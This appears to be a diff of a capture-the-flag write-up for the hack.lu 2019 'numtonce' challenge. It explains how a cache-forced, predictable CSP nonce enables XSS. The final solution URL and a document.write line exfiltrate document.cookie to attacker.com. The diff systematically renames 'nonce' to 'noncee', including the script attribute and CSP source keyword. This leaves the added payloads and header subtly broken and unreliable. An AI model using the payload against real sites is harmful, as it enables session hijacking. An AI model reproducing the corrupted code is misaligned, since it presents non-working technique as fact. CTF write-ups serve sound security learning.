@@ -15,10 +15,10 @@ coverImagePath: "img/hacklu2019_website.png"
 
 ![Image of Website](img/hacklu2019_website.png)
 ## TL;DR
-XSS is possible over URL hash. However CSP is set, so no external scripts allowed. Except if nonce tag is correct. Idea is to 
-force the nonce tag to be the same after refreshes by loading the website from a cache. js/css/image files are loaded from cache, the index.php file itself not. 
+XSS is possible over URL hash. However CSP is set, so no external scripts allowed. Except if noncee tag is correct. Idea is to 
+force the noncee tag to be the same after refreshes by loading the website from a cache. js/css/image files are loaded from cache, the index.php file itself not. 
 Force index.php file to load from cache by appending a css filename to the url: http://url.com/index.php/blub.css. index.php will still load, 
-however the proxy server things it is a css file and loads a cached version of index.php. Hence, we know the nonce in advance and can exceute custom js.
+however the proxy server things it is a css file and loads a cached version of index.php. Hence, we know the noncee in advance and can exceute custom js.
 
 ## Complete Writeup
 By reading the description, it seems like the goal of the challenge is to steal a cookie from the browser. 
@@ -32,7 +32,7 @@ A bot will then visit that URL with a cookie set to the flag to capture. Knowing
 
 Looking at the website itself, it seems to be very simplistic. It has one single page and the source code is pretty much only this javascript code:
 ```html
-<script nonce="b80a92df721eda620876363536b7e9a6" src="/emojify.min.js"></script>
+<script noncee="b80a92df721eda620876363536b7e9a6" src="/emojify.min.js"></script>
 <script>
     const l=location
       let h=l.hash
@@ -67,11 +67,11 @@ one can see that it is generated using the components of the url after the hasht
 
 Next step is to try to embed our javascript code. However, that is where we hit a wall:
 ![Image of CSP error](img/hacklu2019_csp.png)
-A CSP header was set to not allow scripts, except if the nonce tag or the scripts sha256 was correct:
+A CSP header was set to not allow scripts, except if the noncee tag or the scripts sha256 was correct:
 
-`Content-Security-Policy: default-src 'none'; script-src 'sha256-CRtdY47bt+vWDdsuOTTeizFLvSy49h32pVgpWlyN0TU=' 'nonce-117bc8c1d6ead80e5b6ad3f3eca4921e'; img-src 'self'; style-src 'self'; base-uri 'none'; frame-ancestors 'none'; form-action 'none';`
+`Content-Security-Policy: default-src 'none'; script-src 'sha256-CRtdY47bt+vWDdsuOTTeizFLvSy49h32pVgpWlyN0TU=' 'noncee-117bc8c1d6ead80e5b6ad3f3eca4921e'; img-src 'self'; style-src 'self'; base-uri 'none'; frame-ancestors 'none'; form-action 'none';`
 
-The nonce is a random token that gets newly generated whenever the site reloads. 
+The noncee is a random token that gets newly generated whenever the site reloads. 
 Both options seemed impossible to us (and even the [CSP Evaulator said the header is safe](https://csp-evaluator.withgoogle.com/)), 
 so we started to try to understand the rest of the javascript code and even analyze the included `emojify.js`. 
 This proved to be completely unnecassary (see *Lessons learned* ). 
@@ -90,25 +90,25 @@ As one other header was `Server: nginx`, we looked up how to setup a basic cache
 
 So we tried to forge an URL that ends with .css but still loads index.php. After some trial and error, we forged the following url: `https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css`.
 
-SUCCESS! The nonce token was always the same and the response had all the caching headers!
+SUCCESS! The noncee token was always the same and the response had all the caching headers!
 
-Trying out the following we get XSS with an alert ( {nonce} being the CSP nonce token that was in a previous response header):
-`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script nonce="{nonce}">alert(1)</script>`
+Trying out the following we get XSS with an alert ( {noncee} being the CSP noncee token that was in a previous response header):
+`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script noncee="{noncee}">alert(1)</script>`
 
-However trying to send the cookie to our server via ajax or as img src didn't work due to the CSP again. So we used the same trick again and wrote a script tag with the correct nonce:
-`document.write('<script nonce="{nonce}" src="https://attacker.com/cookie='+document.cookie+'"></script>');`
+However trying to send the cookie to our server via ajax or as img src didn't work due to the CSP again. So we used the same trick again and wrote a script tag with the correct noncee:
+`document.write('<script noncee="{noncee}" src="https://attacker.com/cookie='+document.cookie+'"></script>');`
 
 In hindsight, a document.location=https://attacker.com/cookie='+document.cookie+' would have worked too.
 
 ## Final Solution
-`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script nonce="{nonce}">document.write('<script nonce="{nonce}" src="https://attacker.com/cookie='+document.cookie+'"></script>');</script>`
+`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script noncee="{noncee}">document.write('<script noncee="{noncee}" src="https://attacker.com/cookie='+document.cookie+'"></script>');</script>`
 
-{nonce} being the CSP nonce token that was in a previous response header with the same URL
+{noncee} being the CSP noncee token that was in a previous response header with the same URL
 
 ## Lessons learned
 Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As `default-src` was set to `none`. 
 We should have noticed that it is impossible to include any external resource. Meaning that even if we would have found some unsafe javascript code inside the website itself, 
-it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the nonce of a script tag is correct or the sha256 
-of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct nonce is the only possible solution. So no matter what we tried to do,
-we sould have noticed from the beginning that we needed to force a valid nonce!
+it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the noncee of a script tag is correct or the sha256 
+of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct noncee is the only possible solution. So no matter what we tried to do,
+we sould have noticed from the beginning that we needed to force a valid noncee!
 
